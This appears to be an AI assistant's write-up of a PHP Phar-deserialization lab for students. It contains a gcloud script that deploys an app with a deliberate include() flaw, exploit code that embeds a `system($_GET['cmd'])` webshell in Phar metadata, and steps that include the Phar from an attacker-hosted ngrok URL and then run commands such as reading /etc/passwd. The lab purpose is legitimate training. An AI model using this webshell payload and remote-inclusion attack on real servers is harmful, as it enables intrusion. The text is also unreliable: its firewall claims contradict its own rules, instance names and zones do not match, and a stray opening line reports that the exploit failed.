FAILED after point phar. remote link opens. 

Let's set up a challenging, real-life web attack scenario using Apache and PHP. We'll create a fully patched and updated environment on a Google Cloud instance, hosting a web application with a subtle and hard-to-detect vulnerability: an **Object Injection via PHP's Phar Deserialization**, leading to **Remote Code Execution (RCE)**.

This vulnerability is advanced and realistic, requiring deep knowledge of PHP serialization mechanisms and exploiting Phar archives. It will challenge your students to think critically and apply advanced exploitation techniques.

---

## **Overview**

- **Environment**: Ubuntu 20.04 LTS, Apache2, PHP 7.4 (fully updated and patched)
- **Vulnerability**: PHP Phar Deserialization leading to Remote Code Execution
- **Objective**: Students need to find and exploit the vulnerability to execute arbitrary commands on the server.

---

## **Setup Script: `setup_phar_vulnerable_server.sh`**

Below is the shell script that will set up the vulnerable environment. Save this script as `setup_phar_vulnerable_server.sh`.

```bash
#!/bin/bash

mkdir attack-5-php
cd attack-5-php

# Create the startup script
cat <<'EOF' > startup-script.sh
#!/bin/bash
sudo apt-get update
sudo apt-get upgrade -y

# Install necessary packages
sudo apt-get install -y apache2 php libapache2-mod-php php-zip

# Enable Apache mods
sudo a2enmod php7.4
sudo a2enmod rewrite

# Create the web application directory
sudo mkdir -p /var/www/html/vulnerable-app

# Create a custom PHP application with a hidden Phar deserialization vulnerability
sudo tee /var/www/html/vulnerable-app/index.php > /dev/null <<'EOPHP'
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
class Logger {
    public $logFile;
    public $initMessage;
    public $exitMessage;

    function __construct() {
        $this->initMessage = "Initialization message.\n";
        $this->exitMessage = "Exit message.\n";
        $this->logFile = "/tmp/app.log";
    }

    function __destruct() {
        echo $this->initMessage;
        file_put_contents($this->logFile, $this->exitMessage, FILE_APPEND);
    }
}

if (isset($_GET['page'])) {
    $page = $_GET['page'];
    include($page . '.php');
} else {
    echo '<h1>Welcome to the Secure App</h1>';
    echo '<p>Please use the navigation menu.</p>';
}
EOPHP

# Create a placeholder page
sudo tee /var/www/html/vulnerable-app/about.php > /dev/null <<'EOPHP'
<h1>About Us</h1>
<p>This is a secure application.</p>
EOPHP

# Configure Apache Virtual Host
# sudo tee /etc/apache2/sites-available/vulnerable-app.conf > /dev/null <<'EOVHOST'
# <VirtualHost *:80>
#     ServerAdmin admin@example.com
#     DocumentRoot /var/www/html/vulnerable-app
#     ErrorLog ${APACHE_LOG_DIR}/error.log
#     CustomLog ${APACHE_LOG_DIR}/access.log combined
#     <Directory "/var/www/html/vulnerable-app">
#         AllowOverride All
#         Require all granted
#     </Directory>
# </VirtualHost>
# EOVHOST

sudo bash -c 'cat > /etc/apache2/sites-available/vulnerable-app.conf <<EOVHOST
<VirtualHost *:80>
    ServerAdmin admin@example.com
    DocumentRoot /var/www/html/vulnerable-app
    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
    <Directory "/var/www/html/vulnerable-app">
        AllowOverride All
        Require all granted
    </Directory>
</VirtualHost>
EOVHOST'

# Enable the new site and disable the default site
sudo a2dissite 000-default.conf
sudo a2ensite vulnerable-app.conf

# Restart Apache to apply changes
sudo systemctl restart apache2
EOF

# Create the instance with termination and auto-delete after 600 seconds
gcloud compute instances create "attack-5-php" \
  --zone "asia-south2-a" \
  --machine-type "c2-standard-4" \
  --image-family "ubuntu-2004-lts" \
  --image-project "ubuntu-os-cloud" \
  --boot-disk-size "10GB" \
  --tags "http-server,lb-health-check,attack-5-php" \
  --metadata-from-file startup-script=startup-script.sh \
  --metadata google-compute-default-timeout=600 \
  --maintenance-policy=TERMINATE \
  --provisioning-model=STANDARD \
  --instance-termination-action=DELETE \
  --max-run-duration=600s

# Get the external IP of the created instance
eip=$(gcloud compute instances describe "attack-5-php" \
  --zone "asia-south2-a" \
  --format="get(networkInterfaces[0].accessConfigs[0].natIP)")

echo "External IP Address: $eip"

# Install Netcat (openbsd version recommended)
echo "Installing Netcat (openbsd)..."
sudo apt-get update
sudo apt-get install -y netcat-openbsd

# Verify Netcat installation
if ! command -v nc &> /dev/null; then
    echo "Netcat installation failed. Exiting."
    exit 1
fi

echo "Netcat installed successfully."

# Wait until port 80 is available
echo "Waiting for port 80 to be live..."
while ! nc -zv $eip 80 2>/dev/null; do
  echo "Port 80 not live yet. Retrying in 5 seconds..."
  sleep 5
done

echo "Port 80 is live! Proceeding with tests."


# Solution
cat <<'EOF' > startup-script-solution.sh
#!/bin/bash
sudo apt-get update
sudo apt-get upgrade -y

# Install necessary packages
sudo apt-get install -y apache2 php libapache2-mod-php php-zip

cd /var/www/html/

sudo tee exploit.php > /dev/null <<'PHPEOF'
<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
class Logger {
    public $logFile;
    public $initMessage;
    public $exitMessage;

    function __construct() {
        $this->initMessage = "Init message.\n";
        $this->exitMessage = "<?php system($_GET['cmd']); ?>\n";
        $this->logFile = "phar://hack.phar/test.txt";
    }
}

$logger = new Logger();

@unlink("hack.phar");

$phar = new Phar("hack.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->addFromString("test.txt", "test");
$phar->setMetadata($logger);
$phar->stopBuffering();
?>
PHPEOF

# Generate phar file. 
php -d phar.readonly=0 exploit.php


# Configure firewall to allow traffic only on port 80
gcloud compute firewall-rules create "mysql-server" \
  --allow tcp:3309 \
  --target-tags "mysql-server" \
  --direction INGRESS

gcloud compute firewall-rules create "allow-3000" \
  --allow tcp:3000 \
  --target-tags "allow-3000" \
  --direction INGRESS

gcloud compute firewall-rules create "allow-8080" \
  --allow tcp:8080 \
  --target-tags "allow-8080" \
  --direction INGRESS

gcloud compute firewall-rules create "allow-8000" \
  --allow tcp:8000 \
  --target-tags "allow-8000" \
  --direction INGRESS

gcloud compute firewall-rules create "allow-8443" \
  --allow tcp:8443 \
  --target-tags "allow-8443" \
  --direction INGRESS
```

---

## **Explanation**

### **1. System Setup**

- **Ubuntu 20.04 LTS**: Fully updated and patched.
- **Apache2 and PHP 7.4**: Standard web server setup.
- **Modules**: `php`, `rewrite` modules enabled.

### **2. Web Application**

- **File Inclusion Vulnerability**: The application includes files based on user input without proper validation.

  ```php
  if (isset($_GET['page'])) {
      $page = $_GET['page'];
      include($page . '.php');
  }
  ```

- **Phar Deserialization Vulnerability**:

  - When a **Phar archive** is included using `include()`, PHP may deserialize metadata contained within the Phar.
  - If an attacker can control the Phar file, they can inject malicious serialized objects.
  - The `Logger` class has a `__destruct()` method, making it suitable for exploitation.

### **3. Apache Configuration**

- **Virtual Host**: Configured to serve the application.
- **Directory Permissions**: Set to allow overrides and access.

### **4. Firewall Configuration**

- Only port **80** is open to simulate a secure environment with minimal exposure.

---

## **Student Challenge**

### **Objective**

- **Find and Exploit**: Students need to find the file inclusion vulnerability and exploit it using Phar deserialization to achieve remote code execution.

### **Difficulty Level**

- **Advanced**: This requires knowledge of PHP internals, Phar archives, and object injection techniques.

---

## **Instructions for Use**

### **1. Run the Setup Script**

#### **a. Save the Script**

Save the script as `setup_phar_vulnerable_server.sh`.

```bash
nano setup_phar_vulnerable_server.sh
```

- Paste the script content.
- Save and exit (`Ctrl+O`, `Enter`, `Ctrl+X`).

#### **b. Make It Executable**

```bash
chmod +x setup_phar_vulnerable_server.sh
```

#### **c. Execute the Script**

```bash
sudo ./setup_phar_vulnerable_server.sh
```

- Wait for the instance to be fully set up.

#### **d. Note the External IP**

After the script completes, find the external IP address:

```bash
gcloud compute instances list
```

- Look for `phar-vulnerable-instance` and note its external IP.

### **2. Verify the Application**

Visit `http://<EXTERNAL_IP>/` in a web browser.

- You should see:

  ```
  Welcome to the Secure App
  Please use the navigation menu.
  ```

- Access the about page:

  ```
  http://<EXTERNAL_IP>/?page=about
  ```

- You should see the About Us page.

---

## **Demonstration Steps**

### **1. Identify the File Inclusion Vulnerability**

- **Observation**: The `page` parameter is used in an `include()` function.
- **Test for LFI (Local File Inclusion)**:

  - Try accessing sensitive files:

    ```
    http://<EXTERNAL_IP>/?page=/etc/passwd
    ```

  - **Result**: Likely to fail due to `include()` adding `.php`.

- **Bypass Technique**:

  - Use `php://filter` to read files:

    ```
    http://<EXTERNAL_IP>/?page=php://filter/convert.base64-encode/resource=index
    ```

  - **Result**: Might get the base64-encoded content of `index.php`.

### **2. Exploit Phar Deserialization**

#### **a. Understanding the Attack Vector**

- **Phar Archives**: PHP can treat Phar files as archives and process them with file functions.
- **Include Vulnerability**: Including a Phar file can trigger deserialization of its metadata.
- **Goal**: Create a malicious Phar file that, when included, executes code via the `__destruct()` method of the `Logger` class.

#### **b. Create the Malicious Phar**

- **On Your Local Machine**:

  - **Create `exploit.php`**:

    ```php
    <?php
    class Logger {
        public $logFile;
        public $initMessage;
        public $exitMessage;

        function __construct() {
            $this->initMessage = "Init message.\n";
            $this->exitMessage = "<?php system($_GET['cmd']); ?>\n";
            $this->logFile = "phar://hack.phar/test.txt";
        }
    }

    $logger = new Logger();

    @unlink("hack.phar");

    $phar = new Phar("hack.phar");
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    $phar->addFromString("test.txt", "test");
    $phar->setMetadata($logger);
    $phar->stopBuffering();
    ?>
    ```

  - **Generate `hack.phar`**:

    ```bash
    php exploit.php
    ```

    - This creates `hack.phar` with malicious metadata.

#### **c. Host the Malicious Phar**

- **Set Up a Local Web Server**:

  ```bash
  php -S 0.0.0.0:8000
  ```

- Ensure `hack.phar` is accessible from your machine's IP at `http://<YOUR_IP>:8000/hack.phar`.

#### **d. Expose Your Local Server to the Internet**

- **Option 1: Use `ngrok`** (easier)

  - Install `ngrok` and expose your local server:

    ```bash
    ngrok http 8000
    ```

  - Note the `Forwarding` URL provided by `ngrok`, e.g., `http://abcdef123.ngrok.io`.

- **Option 2: Use a VPS or External Server**

  - Upload `hack.phar` to a server where it can be accessed publicly.

#### **e. Exploit the Vulnerability**

- **Trigger the Inclusion of the Phar File**:

  ```bash
  http://<EXTERNAL_IP>/?page=http://abcdef123.ngrok.io/hack.phar
  ```

  - Replace with your `ngrok` URL or the URL where `hack.phar` is hosted.

- **Execute Commands**:

  - Now, access:

    ```bash
    http://<EXTERNAL_IP>/tmp/app.log?cmd=id
    ```

  - The `app.log` file now contains PHP code that gets executed, allowing you to run commands.

- **Example**:

  - To get the contents of `/etc/passwd`:

    ```bash
    http://<EXTERNAL_IP>/tmp/app.log?cmd=cat /etc/passwd
    ```

#### **f. Achieve Remote Code Execution**

- You now have the ability to execute arbitrary commands on the server.

---

## **Notes for the Instructor**

- **Testing the Exploit**: Ensure you can replicate the exploit to confirm everything is working before presenting it to the students.
- **Alternative Hosting**: If exposing your local server is not feasible, you can use a file-sharing service or temporary hosting to serve `hack.phar`.
- **Security Reminder**: This setup is for educational purposes. Ensure the instance is secured after the exercise.

---

## **Guidelines for Students**

- **Objective**: Find and exploit the vulnerability to execute arbitrary commands on the server.
- **Allowed Tools**: Any ethical hacking tools and techniques (e.g., Burp Suite, OWASP ZAP, custom scripts).
- **Rules**:

  - Do not attack other systems.
  - Do not perform destructive actions.
  - Document all steps taken.

- **Time Limit**: 3 hours.

---

## **Post-Exercise Cleanup**

### **Delete the Instance and Firewall Rule**

Create a `delete.sh` script:

```bash
#!/bin/bash

# Delete the Compute Engine instance
sudo gcloud compute instances delete "phar-vulnerable-instance" \
  --zone "us-central1-a" \
  --quiet

# Delete the firewall rule
sudo gcloud compute firewall-rules delete "allow-http" \
  --quiet

# Clean up local files
sudo rm -f startup-script.sh
```

- **Make It Executable**:

  ```bash
  chmod +x delete.sh
  ```

- **Run the Script**:

  ```bash
  sudo ./delete.sh
  ```

---

## **Summary**

- **Challenge**: Students must discover and exploit a Phar deserialization vulnerability in a PHP application running on Apache.
- **Complexity**: The vulnerability is subtle and requires advanced knowledge to exploit.
- **Learning Outcome**: Students will gain experience with real-life advanced web attacks and understand the importance of secure coding practices.

---

## **Additional Tips**

- **Prepare a Walkthrough**: Have a step-by-step solution ready to discuss after the exercise.
- **Monitor Activity**: Keep an eye on the server logs to ensure students stay within scope.
- **Reinforce Best Practices**: After the exercise, discuss how such vulnerabilities can be prevented (e.g., input validation, avoiding dynamic includes, disabling Phar deserialization).

---

**Let me know if you need any further assistance or adjustments to this setup!**